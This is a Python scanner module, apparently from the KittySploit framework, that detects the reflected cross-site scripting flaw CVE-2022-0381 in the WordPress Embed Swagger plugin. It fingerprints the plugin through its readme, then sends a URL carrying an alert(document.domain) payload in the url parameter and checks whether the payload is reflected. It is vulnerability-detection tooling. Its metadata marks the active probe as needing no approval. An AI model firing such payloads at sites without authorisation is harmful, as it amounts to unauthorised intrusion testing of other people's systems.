#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Embed Swagger plugin 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Embed Swagger <=1.0.0 - Cross-Site Scripting Detection',
        'description': 'WordPress Embed Swagger plugin 1.0.0 and prior contains a reflected cross-site scripting vulnerability due to insufficient escaping/sanitization and validation via the url parameter found in the ~/swagger-iframe.php file, which allows attackers to inject arbitrary web scripts onto the page.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'swagger', 'xss', 'wordpress', 'embed_swagger_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://gist.github.com/Xib3rR4dAr/4b3ea7960914e23c3a875b973a5b37a3',
            'https://www.wordfence.com/vulnerability-advisories/#CVE-2022-0381',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0381',
            'https://plugins.trac.wordpress.org/browser/embed-swagger/trunk/swagger-iframe.php#L59',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-0381',
    }

    def run(self):
        path = '/wp-content/plugins/embed-swagger/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Embed Swagger', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('url: "xss://"-alert(document.domain)',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Embed Swagger <=1.0.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

